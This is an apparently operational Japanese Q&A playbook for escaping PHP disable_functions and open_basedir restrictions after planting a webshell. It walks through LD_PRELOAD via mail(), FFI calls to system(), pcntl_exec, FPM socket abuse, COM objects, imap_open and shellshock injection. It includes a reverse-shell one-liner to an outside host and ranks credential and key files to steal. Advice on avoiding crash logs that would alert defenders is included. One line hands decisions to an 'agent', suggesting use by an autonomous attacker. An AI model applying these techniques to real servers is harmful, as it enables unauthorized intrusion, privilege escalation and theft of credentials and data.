# 権限昇格と足場 · disable_functions/制限付き実行の迂回

### webshell を取得した最初の一歩:まず「自分がどんな檻に閉じ込められているか」を把握する
**Q1**: PHP webshell を書き込んだ直後、`system()` を実行するとすぐにエラーになるか出力が出ない。権限がないのか禁止されているのか分からない場合、まず何をすべきか?
**A1**: 慌てて EXP を探して猛試ししない。まず 1 分間の「環境測量」を行う:`phpinfo()` を読み、取れなければ `ini_get_all()`/`ini_get('disable_functions')` で項目ごとに出力する。重点的に 5 つを掴む:`disable_functions` リスト、`open_basedir`、`safe_mode`(旧バージョン)、PHP バージョン、SAPI(fpm/cli/apache module/cgi)。判定基準:檻の形が分かって初めて、どの柵が緩いか分かる。コマンド実行が禁止されていれば実行原語の置換に進み、ファイルアクセスが制限されていれば読み書きの経路に進み、両方が禁止されていればメモリ馬/プロトコル側に進む。
**Q2**: phpinfo を出力できず、`ini_get` もフィルタされる場合はどうするか?
**A2**: 「挙動検知」に方向転換する:`function_exists()` で候補を 1 つずつ検知し(`exec/passthru/popen/proc_open/shell_exec/pcntl_exec/mail/imap_open/dl` など)、「存在し、かつ無効化されていない」ものをホワイトリストに列挙する。これは設定を読むより実際に即している。一部の関数は設定では禁止されていなくても、suhosin やホストポリシーに遮断されるためである。
**Q3**: どの関数が「漏れている」実行可能な関数かをどう素早く判断するか?
**A3**: disable_functions はブラックリストなので、必ず誰かが漏らす。まず見落とされやすいものを優先的にスキャンする:`proc_open`、`popen`、`pcntl_exec`、`mail`/`mb_send_mail`(sendmail -X 付き)、`imap_open`、`dl`、`putenv`+`mail`。どれか 1 つに該当すれば、実行の問題はほぼ解決する。
**Q4**: コマンド実行関数が全てブラックリストに入り、1 つも漏れていない場合(遮断されて方向転換)はどうするか?
**A4**: 「直接実行」のディメンションを諦め、3 つの直交する経路に方向転換する:(1) ファイル読み書きの経路。`file_put_contents`/`fopen` で crontab を書く、SSH authorized_keys を書く、web ディレクトリの別スクリプトを書く。(2) メモリ/拡張の経路。LD_PRELOAD ハイジャック、悪意ある so のロード、FFI。(3) プロトコル側。本機でリッスンする他のサービス(FastCGI、Redis、MySQL UDF)を探して PHP を迂回し、直接実行する。
**Q5**: どの直交経路を先に進むかをどう決めるか?
**A5**: 「最小の依存」を見る。`putenv` と、子プロセスを起動できる何らかの関数(`mail`/`error_log`)がまだ生きている → 先に LD_PRELOAD を試す。コストが最も低い。ファイルを書けて web ルートが分かる → 別言語のスクリプト(Python/Perl CGI)を書く。本機の 9000 番ポートが開いている → FastCGI の経路。依存が最も少ないものを先に攻める。
**Q6**: 1 本も通らない場合、引き下がるべきか続けるべきか?
**A6**: 排除済みのディメンション(実行関数全禁止、putenv なし、open_basedir が厳しい、ローカルサービスなし)を記録し、「権限昇格が本当に必要か」を見ることに方向転換する。現在の www 権限で対象データ/設定/鍵を既に読めるかもしれず、必ずしも shell は要らない。先にタスクの目標を再確認してから深掘りするか決める。

### disable_functions リストが手元にあるとき、どう「漏れ」を選ぶか
**Q1**: 完全な disable_functions リストを得た。数十個の関数があるが、使える実行原語をどう体系的に見つけるか?
**A1**: 実行能力を 4 種類に分けて種類ごとに照合する:(1) 直接コマンド系 `system/exec/passthru/shell_exec/popen/proc_open`。(2) コード系 `pcntl_exec/pcntl_fork`。(3) 副作用系 `mail/mb_send_mail/imap_open/error_log/dl`。(4) 拡張/メモリ系 FFI、`putenv`+トリガー。管理者は通常 1 種類目しか封じず、後ろの 3 種類はまとめて漏れることが多い。
**Q2**: リストで proc_open も popen も封じられている場合、まだ見込みはあるか?
**A2**: ある。`pcntl_exec` がリスト外かを見る。これはしばしば忘れられ、しかも shell を経由せず直接 execve できて一歩で完了する。次に `dl()` が動的拡張をロードできるかを見る。
**Q3**: pcntl 系は fpm 環境ではコンパイルされていないことが多いが、どう確認するか?
**A3**: `function_exists('pcntl_exec')` が false を返せば、モジュールが入っていないだけで禁止ではないので、この経路は元々通らない。時間を浪費せず、`mail`/`imap_open` のような「借力」関数を見に行く。
**Q4**: mail 関数は無害に見えるが、どうコマンドを実行できるのか?
**A4**: sendmail の経路を借りる。`putenv` で LD_PRELOAD を悪意ある so に設定し、`mail()` を呼んで fork/execve をトリガーし、so の `__attribute__((constructor))` をロードさせる。コマンドは so のロード瞬間に実行される。判定基準:`mail` が存在 + `putenv` が存在 + so ファイルを書ける、の 3 つが揃えばよい。
**Q5**: putenv も禁止され、LD_PRELOAD の線が切れた場合(遮断されて方向転換)はどうするか?
**A5**: FFI のディメンションに方向転換する(PHP 7.4+):`ffi.enable` が disabled でなければ、FFI の `cdef` で `system`/`execve` を宣言して呼び出せば、disable_functions を完全に迂回できる。これは PHP の関数テーブルではなく C ABI を通るからである。
**Q6**: FFI も無効で、PHP バージョンも 7.4 未満の場合、どう方向転換するか?
**A6**: 「外部サービス」の直交ディメンションに方向転換する:本機の `127.0.0.1` 上のリッスンポートを列挙し、FastCGI(9000)、Redis(6379)、MySQL を探す。PHP の socket/fsockopen(これらは滅多に禁止されない)で直接それらと対話し、実行をトリガーする。

### open_basedir が私を web ディレクトリに閉じ込めて出られない
**Q1**: コマンドは実行できるが、`open_basedir` で web ディレクトリしかアクセスできず、`/etc/passwd` を読めない。どう突破するか?
**A1**: まず切り分ける:コマンド実行が既に通っているなら(system が使える)、`open_basedir` は PHP のファイル関数だけを制限し、子プロセスは制限しない。直接 `system('cat /etc/passwd')` で迂回できる。判定基準:open_basedir は PHP 層のサンドボックスであり、子プロセスはこの制限を継承しない。
**Q2**: コマンド実行が通らず、PHP のファイル関数しか使えない場合、open_basedir をどう迂回するか?
**A2**: 定番の chdir + ini_set の組み合わせを使う:`mkdir` で多層ディレクトリを作り、段階的に `chdir('..')` して `ini_set('open_basedir','..')` と組み合わせ、徐々に外へ出て、最後に `chdir('/')` でルートに落ち、再び open_basedir を空に設定する。これは純粋な PHP ロジックの迂回で、コマンド実行は不要である。
**Q3**: chdir の迂回が失敗する場合、原因として何が考えられるか?
**A3**: 高バージョンの PHP が一部のパスエスケープを修正済み、または `ini_set` が open_basedir に対して狭める方向しか許さず広げる方向を許さない。`glob://` プロトコルや `DirectoryIterator`/`SplFileObject` に替えると、制限外のディレクトリ名を列挙できることがある(内容は読まない。まず偵察する)。
**Q4**: 読みたい具体的なファイルパスが分からず、ディレクトリ列挙しかできない場合はどうするか?
**A4**: `glob://` のワイルドカードで構造を列挙するか、エラー表示を利用する(存在しないファイルを故意に include して PHP にパスを吐かせる)。先にディレクトリツリーを測量し、設定ファイル/鍵を特定してから狙って読む。
**Q5**: PHP 側の迂回が全て高バージョンで塞がれた場合(遮断されて方向転換)はどうするか?
**A5**: 「能力の昇格」のディメンションに方向転換する:open_basedir は PHP のサンドボックスにすぎないので、コマンド実行を 1 回でも得ればそこから完全に抜けられる。disable_functions 迂回の経路(LD_PRELOAD/FFI/FastCGI)に戻り、子プロセスを得れば自由になる。
**Q6**: コマンド実行すら得られず、特定の機微ファイル 1 つだけ読みたい場合はどうするか?
**A6**: 「サービスの迂回」ディメンションに方向転換する:本機に MySQL があり現在の PHP が接続できるなら、`LOAD_FILE()` や `LOAD DATA` でファイルを読む。MySQL のファイル権限は open_basedir から独立している。または SSRF で本機のサービスを攻めてファイルを読む。

### LD_PRELOAD を撃ったが反応しない、連鎖のどこが切れたのか
**Q1**: `putenv('LD_PRELOAD=/tmp/x.so')` してから `mail()` を呼んだが、コマンドが実行されない。どう調査するか?
**A1**: 環ごとに検証する。第 1 環:so が正常に書き込まれ、パスが読めるか(権限、open_basedir が /tmp を遮っていないか)。第 2 環:so が正常にコンパイルされ、対象アーキテクチャが一致するか(x86/x64、glibc バージョン)。第 3 環:トリガー関数が本当に新プロセスを fork したか。3 環のどれかが切れても出力は出ない。
**Q2**: so 内のコンストラクタが呼ばれたかをどう確認するか?
**A2**: so の constructor に「観測できる」ことをさせる。証拠ファイルを読めるディレクトリに書く、リバース接続を張る、ファイルを touch する。副作用が見えて初めてロード成功を証明できる。副作用がなければロードされていない。
**Q3**: mail トリガーが効かない場合、何に替えるか?
**A3**: 代替は多数ある:`error_log()` が sendmail を通る際も fork する、`mb_send_mail` も同源、`imap_mail`、および間接的に `popen` を呼ぶあらゆる関数(一部の拡張関数は内部でプロセスを起動する)。禁止されていない 1 つを選んで試す。
**Q4**: 対象が Alpine または musl 環境で、glibc の so がロードできない場合はどうするか?
**A4**: 対象の libc に合わせて so を再コンパイルする。先に `ldd /bin/sh` または `/lib` ディレクトリを読んで libc の種別を判断し、対象に合わせてコンパイルする。Alpine は musl が多く、静的コンパイルか musl-gcc でクロスコンパイルする。
**Q5**: mail コマンド自体が存在しない(コンテナの最小イメージに sendmail がない)場合、連鎖全体が切れた(遮断されて方向転換)場合はどうするか?
**A5**: 「関数ハイジャック」の変種に方向転換する。sendmail に依存しない LD_PRELOAD の使い方として、PHP 本体が自分で `dlopen` する際にトリガーされる hook ポイント(拡張ロード)を探す。または FFI/FastCGI/UDF の経路に完全に方向転換する。LD_PRELOAD は唯一解ではない。
**Q6**: SELinux/AppArmor が mmap/execstack を制限し、so のロードがカーネルに拒否される場合はどうするか?
**A6**: `dmesg` または audit ログに avc denied レコードがある(権限があれば)。ポリシーを無理に迂回できず、サンドボックス分析に転換する。SELinux は特定の domain の fork/execmem だけを遮るので、カーネルシステムコールを通る別経路(既存の信頼された daemon を介したトリガー)に替えれば可能性がある。または LD_PRELOAD を直接諦め、プロセス内ハイジャック(FFI で既にロード済みのライブラリ関数を使う)に進む。

### mail が通らないとき、LD_PRELOAD のトリガーを別の場所に移す
**Q1**: putenv + LD_PRELOAD の組み合わせは使えるが、sendmail がなく mail 呼び出しで子プロセスが出ない。どうトリガーするか?
**A1**: 目標は mail 自体ではなく、「現在のプロセスに fork/execve で子プロセスを 1 回作らせる」ことである。子プロセスが libc をロードするときに LD_PRELOAD を読む。内部で popen や exec をする PHP 関数は全て候補になる。判定基準:新しいプロセスの pid が現れるのが観測できれば成功である。
**Q2**: 具体的に「隠れたトリガー」には何があるか?
**A2**: `error_log()` は message_type=1 のとき sendmail を通る。`imap_open` の旧バージョンは mailbox 文字列を解析して子プロセスを起動する(かつ歴史的にコマンド注入 CVE がある)。`gnupg_*` ファミリーは gpg 子プロセスを起動する。`ImageMagick` 関連関数は内部で delegate が convert 子プロセスを起動する(ImageTragick と同じ流れ)。
**Q3**: 対象に imagick 拡張しか入っていない場合、使えるか?
**A3**: 使える。悪意ある画像をアップロード/ロードして imagick に処理させるか、直接 `Imagick::__construct('epi:xxx')` で delegate をトリガーする。この経路が LD_PRELOAD と無関係なとき、ImageTragick 自体が RCE になる。
**Q4**: トリガーはしたが、LD_PRELOAD 環境変数が子プロセスに継承されない場合はどうするか?
**A4**: setuid バイナリかどうかを確認する。glibc は setuid プログラムに対して LD_PRELOAD を無視する(secure-execution モード)。sendmail はしばしば suid 属性を持つ。非 setuid の対象プログラムにトリガーを替える。
**Q5**: 全てのトリガーを試しても効かない場合、さらにどこへ方向転換するか(遮断されて方向転換)?
**A5**: `LD_LIBRARY_PATH` でシステムライブラリ依存をハイジャックする(既存 .so の検索優先度を変える)、または `GCONV_PATH`/`NLSPATH` 系の環境変数で glibc の iconv/locale ロードパスをハイジャックする。これらも LD_PRELOAD ファミリーの兄弟チャネルで、原理は同じで変数が違うだけである。
**Q6**: putenv は許可されているが特定の接頭辞だけ許可されている場合はどうするか?
**A6**: PHP の `safe_mode_allowed_env_vars` または suhosin が putenv の接頭辞を制限する。どの接頭辞が許可されているか 1 つずつ調べる。LD_、GCONV_、NLS_ が全て封じられているとは限らず、漏れている 1 つを探して続ける。

### FFI が禁止されていない場合のワンショット即死経路
**Q1**: PHP 7.4+ 環境で、ffi.enable の値が不明な場合、どう判定して利用するか?
**A1**: 先に `ini_get('ffi.enable')` を見る:値が `true` または `1` ならどのスクリプトでも直接使える。値が `preload` ならプリロードスクリプトでしか使えず、通常は攻められない。`false`/`0` なら無効。判定基準:文字列 true/1/on は全て有効とみなす。
**Q2**: FFI で何ができるか?
**A2**: C ライブラリ関数を直接呼べる。`FFI::cdef("int system(const char*);", "libc.so.6")->system("id")`。dlopen+dlsym を通り、PHP の関数テーブルを検査しないので、disable_functions 全体を迂回できる。
**Q3**: FFI が libc.so.6 が見つからないというエラーを返す場合はどうするか?
**A3**: パスを替える。`ldconfig -p | grep libc` で特定するか、`/lib/x86_64-linux-gnu/libc.so.6`(Debian/Ubuntu)または `libc.musl-x86_64.so.1`(Alpine)を直接指定する。cdef の第 2 引数を省略して FFI に既定のライブラリから探させることもできる。
**Q4**: cdef は許可されているが `FFI::load` が制限されている場合はどうするか?
**A4**: インライン cdef を使えばよく、load でヘッダを読む必要はない。宣言したプロトタイプのシグネチャが一致すれば呼べる。`system/execve/fork/dlopen` はシグネチャが単純なので、直接手で書ける。
**Q5**: FFI が完全に無効(preload または false)の場合、遮断されてどこへ方向転換するか?
**A5**: 「拡張ロード」のディメンションに方向転換する。`dl()` が禁止されておらず `enable_dl=On` なら、`dl('悪意ある.so')` で自作拡張をロードし、拡張の MINIT 内で何でもする。これは FFI の先輩格の経路である。
**Q6**: dl も禁止されている場合はどうするか?
**A6**: 「外部サービス/メモリ馬」のディメンションに方向転換する。PHP プロセス内で檻を破るのは諦め、FPM 直結/FastCGI で自分を攻める/SSRF gopher で Redis UDF を攻める。「PHP 内から PHP サンドボックスを破る」経路はここで終わるので、直交する経路に替える。

### imap_open 系拡張関数の歴史的なコマンド注入
**Q1**: disable_functions に `imap_open` がなく、PHP にも imap 拡張が入っている場合、直接利用できるか?
**A1**: PHP バージョンを見る。7.1.x 以前と一部の 7.2/7.3 には既知の imap_open パラメータのコマンド注入がある(mailbox パラメータで -oProxyCommand などを rsh/ssh 子プロセスに渡す)。判定基準:バージョンが該当すれば見込みがあり、該当しなければこの関数はないものとみなす。
**Q2**: 利用条件をどう素早く判定するか?
**A2**: 3 点セットである:(1) `phpversion()` が脆弱性の範囲に入る。(2) `function_exists('imap_open')`。(3) `imap.enable_insecure_rsh` が通常 On であること(一部の変種は不要)。3 つが揃えば payload を構築できる。
**Q3**: トリガー後、出力が出ない場合はどうするか?
**A3**: imap_open の注入結果は通常、直接出力されない。注入したコマンドに web ディレクトリへファイルを書かせるか、リバース接続を張らせて、副作用で観測する。LD_PRELOAD と同じ考え方である。
**Q4**: バージョンは該当するが通らない。ディストリビューションが既にパッチを戻したのでは?
**A4**: 多くのディストリビューション(Debian/Ubuntu/RHEL)は phpversion の文字列を変えずにパッチを backport する。`phpinfo()` の「PHP Extension Build」やパッケージマネージャーのバージョン番号を見るか、挙動を直接観測する(明らかな payload を送ってフィルタされるか見る)。
**Q5**: パッチ済みで imap の経路が通らない場合、遮断されてどこへ方向転換するか?
**A5**: 同種の「拡張内コマンド注入」CVE ファミリーに方向転換する。歴史的に `PHP-GD`、`ImageMagick delegate`、`Ghostscript delegate`、`ExifTool` などにパラメータ注入の RCE があった。どの拡張が入っているかを見て、対象を絞って CVE を調べる。
**Q6**: 1 つも入っておらず、PHP 層で解決したい場合、可能か?
**A6**: かなり無理がある。PHP 層では解けないと認め、SAPI/ミドルウェア層に方向転換する。LD_PRELOAD/FFI/FastCGI/UDF の直交経路に戻る。

### pcntl_exec が禁止されていない場合の極簡利用
**Q1**: 走査して `pcntl_exec` が存在し禁止されていない場合、リバース shell を最速で張るには?
**A1**: ワンライナー `pcntl_exec('/bin/bash', ['-c', 'bash -i >& /dev/tcp/A/P 0>&1'])` を使う。shell 解析を経由せず直接 execve で現在のプロセスを置き換えるので、むしろ安定する。判定基準:呼び出しが成功すると現在の PHP worker が置き換えられ、fpm が自動で新しいものを立ち上げるので、接続が手に入る。
**Q2**: 現在のプロセスを置き換えるとどんな副作用があるか?
**A2**: HTTP リクエストがレスポンスを返さず、接続がハングするか 502 になる。ペネトレーションでは許容できる代償である。fpm に異常な挙動をさせたくなければ、先に `pcntl_fork` して子プロセス内で `pcntl_exec` する。
**Q3**: pcntl_exec しかなく pcntl_fork が禁止されている場合はどうするか?
**A3**: 現在のプロセスが呑み込まれるのを受け入れる。または `pcntl_exec('/bin/sh', ['-c', 'nohup ... &'])` でコマンドをバックグラウンド化し、プロセスは置き換えられるがコマンドは fork 済みになる。
**Q4**: pcntl_exec が「not enabled」とエラーを返すが function_exists が true の場合?
**A4**: fpm モードでは pcntl が明示的に無効化されることが多く、関数は登録されていても実行時に拒否される。`phpinfo()` の pcntl セクションが「enabled」か確認する。本当に禁止なら遮断とみなす。
**Q5**: 遮断されてどこへ方向転換するか?
**A5**: pcntl_exec が死んでも見込みがないわけではない。`mail`/`imap_open`/`error_log` + LD_PRELOAD の「他人の fork を借りる」経路に戻る。自分で fork せず、他人の fork を借りる。
**Q6**: リバースしてきた shell が fpm の worker 権限(www-data)で足りない場合、どう引き継ぐか?
**A6**: これは権限昇格の入口であって終点ではない。即座にローカル情報収集を行う(後続の sudo -l/SUID/capabilities/カーネルバージョンの連鎖を参照)。同時に tty 昇格を行い(tty 昇格連鎖を参照)、次の段階のローカル権限昇格に備える。

### Apache CGI/mod_php + .htaccess で handler を替える迂回
**Q1**: 対象が Apache + mod_php で、disable_functions は厳しいが `AllowOverride All` で、自分の web ディレクトリに `.htaccess` を書ける。何ができるか?
**A1**: handler を替える。ある拡張子を別の CGI ハンドラに再マッピングする `.htaccess` を書く(例 `AddHandler cgi-script .xxx` または `SetHandler application/x-httpd-cgi`)。その後、対応する CGI スクリプト(Perl/Bash CGI)をアップロードする。別の handler 連鎖を通るので、PHP サンドボックスを完全に迂回できる。
**Q2**: mod_cgi が有効でない場合はどうするか?
**A2**: `Options ExecCGI` を確認する。有効でなければ CGI handler は効かない。`AddType application/x-httpd-php .xxx` で PHP の別名拡張子が disable_functions に管理されるか試す。大多数は同じ ini で全体的に管理されるので、この経路は通らない。
**Q3**: handler を PHP に替えつつ `php_admin_value disable_functions ""` を組み合わせれば、disable_functions を直接空にできるか?
**A3**: `php_admin_value` は httpd.conf/vhost でしか効かず、.htaccess では効かない。`.htaccess` では `php_value` しか使えず、admin 系を上書きできない。この経路は通常通らない。
**Q4**: FPM モードでは `.htaccess` の php_value が完全に無効な場合、どうするか?
**A4**: FPM は .htaccess の php_value を無視する。PHP 設定は FPM プールでロードされるからである。この経路は FPM には本質的に無効である。FPM プール設定を書けるかを見る(通常は権限がない)。
**Q5**: .htaccess の書き込み権限がないか、遮断された場合、遮断されてどこへ方向転換するか?
**A5**: 「別言語のスクリプトをアップロードする」ディメンションに方向転換する。web ディレクトリに .py/.pl/.cgi を書けて、Apache に対応する handler 設定がある場合(共用ホストで多い)、別の言語を直接実行する。PHP サンドボックスは一切関与しない。
**Q6**: サイト全体が PHP しか解析せず、handler もロックされている場合、もう選択肢はないか?
**A6**: handler 層では解けないと認め、LD_PRELOAD/FFI/FPM 直結の直交経路に戻る。または「既存 PHP ファイルの汚染」に方向転換する。既存の include ロジックを見つけてメモリ馬を書き込み、ini_set で disable_functions の緩和を試す(admin 系は変えられないが、ini_restore でリセットできることがある)。

### 本機の PHP-FPM 直結で disable_functions を迂回する
**Q1**: fpm が本機の 9000 または unix socket でリッスンし、現在の PHP プロセスが接続できる。なぜ直結で disable_functions を迂回できるのか?
**A1**: disable_functions は各 PHP プロセスが自分の php.ini を読んで決める。本機に別の fpm プール(例:別サイト用)があり、その ini がそこまで厳しくないなら、直結して PHP コードを実行すれば別の disable_functions が適用される。判定基準:禁止されていない fpm プールを掴めば勝ちである。
**Q2**: fpm プールが 1 つだけで ini も同一の場合、直結にまだ意味はあるか?
**A2**: 別の手がある。FastCGI プロトコルは `PHP_ADMIN_VALUE` 環境変数でリクエスト粒度の ini 項目を上書きできる。`disable_functions` は PHP_INI_SYSTEM で変えられないが、`open_basedir`、`auto_prepend_file` は変えられる。`PHP_VALUE=auto_prepend_file=/proc/self/environ` や任意のローカルファイルをプリロードスクリプトに指定して、ファイルインクルードの RCE を直接トリガーできる。
**Q3**: fpm ポートが本機で通らず、unix socket しかない場合はどうするか?
**A3**: `stream_socket_client('unix:///path/to/fpm.sock')` で同様に接続できる。判定基準:socket パスを見つければ(一般的な /run/php/php-fpm.sock など)、tcp と差はない。
**Q4**: fpm に listen.allowed_clients や security.limit_extensions の制限がある場合はどうするか?
**A4**: `allowed_clients` は tcp にしか効かず、unix socket はファイル権限による。socket が www-data グループ所有で読み書きできれば、直接接続できる。`security.limit_extensions` は .php だけを処理する制限なので、`auto_prepend_file` で任意パスを指し、既存の .php をリクエストしてトリガーする。
**Q5**: FPM が全く起動しておらず mod_php しかない場合、遮断されてどこへ方向転換するか?
**A5**: 直交経路に替える:LD_PRELOAD/FFI/UDF に戻る。または本機の他のインタープリタサービス(Node、Python WSGI の socket)を探す。
**Q6**: FPM は通るがリクエストが空/タイムアウトを返す場合、どう調査するか?
**A6**: FastCGI プロトコルのパケット構築ミスが多い(SCRIPT_FILENAME のパスが存在しない、CONTENT_LENGTH が不一致)。既製の fpm クライアントライブラリを使うか、プロトコルに照らして 1 バイトずつ検証する。またはログ側に語らせる。先に既知の存在する .php をリクエストしてプロトコルが通ることを確認し、それから auto_prepend_file を重ねる。

### Windows 上の PHP の disable_functions - COM チャネル
**Q1**: 対象が Windows + PHP で、disable_functions の一般的な関数が全て封じられている。Windows 特有の手は何があるか?
**A1**: `com_dotnet` 拡張が有効かを見る。`class_exists('COM')` が true なら、直接 `new COM("WScript.Shell")->exec("cmd /c ...")` を使える。COM オブジェクトを通るので disable_functions を検査しない。判定基準:CLI では COM は既定で無効、fpm/apache では有効なことが多いので、直接試せる。
**Q2**: WScript.Shell が EDR に遮断される場合はどうするか?
**A2**: COM オブジェクトを替える:`Shell.Application`、`MSScriptControl.ScriptControl`(Windows Script が必要)、`InternetExplorer.Application`(旧システム)。または WMI を使う:`new COM("winmgmts://")` で `Win32_Process::Create` を呼ぶ。
**Q3**: com_dotnet も有効でない場合、残る手は何か?
**A3**: `.NET` の COM を確認する。`DOTNET` クラス(com_dotnet 拡張が必要)は .NET assembly をインスタンス化して直接 C# コードを実行できる。または `w32api_register_function` のような Windows 固有関数を見る(古い拡張で希少)。
**Q4**: Windows COM の経路が全て切れ、LD_PRELOAD は Linux 専用の場合、遮断されてどこへ方向転換するか?
**A4**: 「FPM 直結」または「ファイル書き込み」に方向転換する。Windows でスケジュールタスク(schtasks)を書くにはコマンド実行が必要だが、スタートアップディレクトリの .lnk や .bat を書くにはファイル書き込み権限だけで足りる。または IIS の handler mapping(web.config)を書いて CGI/ISAPI を有効にし、別のインタープリタを導入する。
**Q5**: Windows 上で LD_PRELOAD と同等の考え方は存在するか?
**A5**: 存在するがより難しい。`AppInit_DLLs` レジストリキー、DLL サイドローディング。いずれもレジストリ書き込み権限かシステムディレクトリ書き込み権限が必要で、PHP サンドボックス内では難しい。
**Q6**: データを取りたいだけの場合、権限昇格は必須か?
**A6**: Windows 環境では IIS AppPool 身元が広い読み取り権限を持つことが多い。先に `whoami /priv` を列挙し、`inetpub`/ログ/web.config にアクセスする。権限昇格なしで対象を取れることが多い。

### dl() による動的拡張ロードの迂回
**Q1**: `dl` が disable_functions にない場合、直接 `dl('悪意ある.so')` できるか?
**A1**: さらに `ini_get('enable_dl')` を見る必要がある。旧 PHP は既定で On、新バージョンや fpm は通常 Off である。2 つの条件が同時に満たされる必要がある。
**Q2**: enable_dl=On だが dl が extension_dir からのロードしか許可しない場合はどうするか?
**A2**: `ini_get('extension_dir')` を読んでパスを得る。書けるなら(通常は権限不足)、自作拡張を放り込む。書けなければ次の経路に進む。
**Q3**: 自作拡張を最も手早く作るには?
**A3**: 最小の zend_module_entry を書き、MINIT 内で system() を 1 回呼ぶだけでよい。PHP 関数を登録する必要はなく、ロードされた時点で実行される。GCC で対象アーキテクチャと PHP バージョンに一致する API 番号にクロスコンパイルする。
**Q4**: PHP バージョンが分からず API 番号が不明で、盲目的コンパイルは失敗率が高い場合はどうするか?
**A4**: 先に `phpversion()`+`PHP_ZTS`+`ZEND_MODULE_API_NO` を検知する。`get_loaded_extensions()` で既にロード済みの拡張の header を読んで逆算するスクリプトを書く。または既製の fuzz 化拡張を使う。複数の API バージョン向けに事前コンパイルしたもの(異なる PHP バージョンに対応する別 so)を用意して、一致するものを選ぶ。
**Q5**: dl がロードを拒否する(署名/ホワイトリスト)、遮断されてどこへ方向転換するか?
**A5**: FFI または LD_PRELOAD に方向転換する。それらは PHP 拡張のロード経路を通らないので、dl の制限を受けない。または FPM 直結に進む。
**Q6**: 拡張系の経路が全て切れ、ファイル読み書きだけが残る場合、まだ何ができるか?
**A6**: crontab / SSH authorized_keys / sudoers.d の正当なサブファイル(通常は権限なし)を書くか、web サービスが読む設定ファイルに毒を仕込む。通常は既に静的認証情報、鍵、DB 接続文字列を取れており、shell は不要である。

### PHP GC UAF / メモリ破壊 exp をいつ投入するか
**Q1**: どのような場合に PHP のメモリ破壊脆弱性(GC UAF 系など)で disable_functions を迂回することを検討するか?
**A1**: 絶対に最後の手段である。前提は、ファイル書き込み権限がなく、拡張ロードもなく、FFI もなく、FPM 直結もなく、かつ PHP バージョンが既知の exp に該当し、任意の PHP コード実行が許されている場合である。判定基準:コストが高く、安定性が低く、opcache 状態の影響が大きい。
**Q2**: この種の exp を第一選択にしないのはなぜか?
**A2**: 大半が具体的な PHP バージョン、ZTS/NTS、opcache、メモリアロケータ状態に依存し、失敗率が高い。失敗すると fpm worker をクラッシュさせてアラートを引き起こす可能性がある。迂回経路で他に行けるなら使わない。
**Q3**: 使うと決めた場合、どうリスクを下げるか?
**A3**: 先に `pcntl_fork`(使えれば)で子プロセス内で exp を実行し、worker がクラッシュしても本体に影響しない。または 1 回のリクエストで終わって抜ける場面を探す。実行前に PHP バージョン、opcache の有無、jit の有無を測量し、対応する変種を選ぶ。
**Q4**: 何度か打って SIGSEGV で成功しない場合、続けるか撤退するか?
**A4**: 撤退する。SIGSEGV はログに残り、連続クラッシュは最強の IoC である。漏れた経路がないか再捜索に戻る(function_exists を再列挙、ini_get_all を再確認して `open_basedir`/`ffi.enable`/`disable_functions` を誤読していないか)。
**Q5**: 対象の opcache が有効でプリコンパイルされており、exp が撃てない場合、遮断されてどこへ方向転換するか?
**A5**: この経路が封じられたと認め、「現状の引き受け」に戻る。root までの権限昇格を諦め、現在の PHP 権限で深い情報収集を行う(読めるものを全て読む、ローカルサービスへの接続を試す)。
**Q6**: exp が成功した場合、後始末は必要か?
**A6**: 汚染された opcache 項目をクリーンアップし、デバッグ出力を残さない。exp 成功時はメモリが破壊されていることが多く、同じ worker 上でその後正常コードを実行すると不安定になり得る。1 回の永続化を終えたら新しい worker に替える。

### ファイル読み取りしかできず実行できない場合の情報収集への方向転換
**Q1**: PHP サンドボックスが厳しく完全に手詰まりで、`file_get_contents`/`include` のようなファイル読み取り能力しかない場合、何に方向転換すべきか?
**A1**: 実行のディメンションが封じられたと認め、現在の足場を「読み取り原語」として最大化利用する。目標を「shell を必ず取る」から「ファイル読み取り能力でデータを取る」に切り替える。判定基準:多くのタスク(認証情報、config、DB データの取得)は root を必要としない。
**Q2**: どの優先順位でファイルを読むべきか?
**A2**: 高い順に:(1) アプリケーション設定(.env、config/database.php、settings.py、application.yml)で DB/クラウド認証情報を取る。(2) 秘密鍵(~/.ssh/id_rsa、/etc/ssl/private)。(3) 履歴コマンド(~/.bash_history、~/.mysql_history)。(4) システム認証情報(/etc/shadow は権限があれば、/var/lib/mysql/mysql/user.MYD)。
**Q3**: open_basedir が web ディレクトリしか読ませない場合はどうするか?
**A3**: 先に前述の chdir/glob 迂回経路で範囲を広げる。外へ出られなければ、web 内の config だけを読む。現代のアプリケーション設定にはほぼ必ず DB 認証情報と API key が含まれ、単一点だけで横展開に十分である。
**Q4**: DB 認証情報を読めたが外へ通らない場合、何ができるか?
**A4**: PHP で直接 DB に接続する(`mysqli`/`pgsql` は通常禁止されない)。ユーザーテーブル、注文、鍵テーブルなどの機微なテーブルを照会する。DB にはアプリケーション層の管理者への横展開に使える admin hash がよくある。
**Q5**: 設定を読んでも全て空/暗号化の場合、遮断されてどこへ方向転換するか?
**A5**: 「ランタイムのメモリ」に方向転換する。`/proc/self/environ` を読んで現在のプロセスの環境変数を得る(鍵を含むことが多い)。`/proc/*/cmdline` を読んで他のプロセスの起動引数を得る(パスワードが漏れることが多い)。`/proc/net/tcp` を読んで内部ネットワークの接続図を把握する。これらは読み取り専用のディメンションで最も価値が高い。
**Q6**: /proc も open_basedir に遮られる場合はどうするか?
**A6**: /proc は仮想 fs で、open_basedir はパス接頭辞のマッチである。`/proc/self` が許可されていれば一部を読める。完全に遮られれば、情報収集も頂点に達したと認め、収集済みの内容をレポートして agent に横展開か終了かを決めさせる。

### shellshock 系 CGI 環境変数注入
**Q1**: 対象が CGI モード(fpm/mod_php ではない)で、User-Agent に payload を入れると実行される。これはどういう状況か?
**A1**: shellshock ファミリー(CVE-2014-6271 とその変種)である。CGI が HTTP ヘッダを環境変数に書き込み、bash が関数定義を解析する際に末尾のコマンドを実行する。判定基準:対象の bash バージョンが古い(4.3 以前で未修正)、かつ CGI handler が bash スクリプトか bash を呼ぶ perl/php CGI であること。
**Q2**: 対象が攻撃可能かをどう素早く判定するか?
**A2**: 検知フラグ `() { :;}; echo x` を User-Agent に入れて、レスポンスやログを見る。レスポンスボディまたはレスポンスヘッダに `x` が現れれば該当である。判定基準:返ってきたパケットのどこかに元の注入文字列のエコーが現れれば命中である。
**Q3**: 該当したが echo の表示しかなく、shell が取れない場合はどうするか?
**A4**: コマンドをリバースか authorized_keys の書き込みに替える。shellshock は(CGI が root で動いていれば)直接 root、または apache ユーザーなので、手に入れたら即座に横展開する。
**Q4**: bash はパッチ済みだが CGI が残っている場合、別の手はあるか?
